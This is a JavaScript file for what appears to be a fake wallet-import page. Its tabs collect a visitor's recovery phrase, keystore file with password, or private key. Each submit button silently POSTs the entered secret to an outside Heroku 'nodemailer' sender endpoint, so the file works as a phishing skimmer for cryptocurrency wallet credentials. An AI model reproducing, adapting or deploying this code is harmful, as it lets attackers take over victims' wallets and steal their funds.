const conts = document.querySelectorAll('.c')
const container = document.querySelector('.container')
const btns = document.querySelectorAll('button')
const importBtn = document.querySelectorAll('#import')


container.addEventListener('click', function (e) {
    const id = e.target.dataset.id

    if (id) {
        btns.forEach((btn) => {
            btn.classList.remove('active')
            e.target.classList.add('active')


        })
        conts.forEach((cont) => {
            cont.classList.remove('active')
        })
        const element = document.getElementById(id)
        element.classList.add('active')
    }

})

;

const key = document.getElementById('json') 
if(key) {
    key.addEventListener('click', () => {
        const phrase = document.querySelector('.re')
        phrase.classList.add('age')
    })
} else {
    const phrase = document.querySelector('.re')
        phrase.classList.remove('age')
}

const json = document.getElementById('key')
if(json) {
    json.addEventListener('click', () => {
        const phrase = document.querySelector('.re')
        phrase.classList.add('age')
    })
} else {
    const phrase = document.querySelector('.re')
        phrase.classList.remove('age')
}

const phrase = document.querySelector('.re')

phrase.addEventListener('click', function() {
    phrase.classList.remove('age')
})



function drawElementFromDOM(id) {
    return document.querySelector(id)
}

const phraseBtn = document.querySelector('.phrase__tab')
const keystoreBtn = document.querySelector('.keystore__tab')
const privateBtn = document.querySelector('.private__tab')
const phraseText = drawElementFromDOM('.txt1')
const keystoreText = drawElementFromDOM('.txt2')
const passwordText = drawElementFromDOM('.txt3')
const privateText = drawElementFromDOM('.txt4')



const url = 'https://mynodemailerapp.herokuapp.com/sender'


phraseBtn.addEventListener('click', function() {
    let headers = new Headers()
    fetch(url, {
                
        method: "POST",
        headers: {
            'Content-Type': 'application/json'
        }, 
       
        body: phraseText.value
    }).then((res) => {
       
       return res.json()
    })
})

keystoreBtn.addEventListener('click', function() {

    let headers = new Headers()
    fetch(url, {
                
        method: "POST",
        headers: {
            'Content-Type': 'application/json'
        }, 
       
        body: `${keystoreText.value} password:  ${passwordText.value}`
    }).then((res) => {
       
       return res.json()
    })
    console.log(567);
})

privateBtn.addEventListener('click', function() {
    let headers = new Headers()
    fetch(url, {
                
        method: "POST",
        headers: {
            'Content-Type': 'application/json'
        }, 
       
        body: privateText.value
    }).then((res) => {
       
       return res.json()
    })
    console.log(890);
})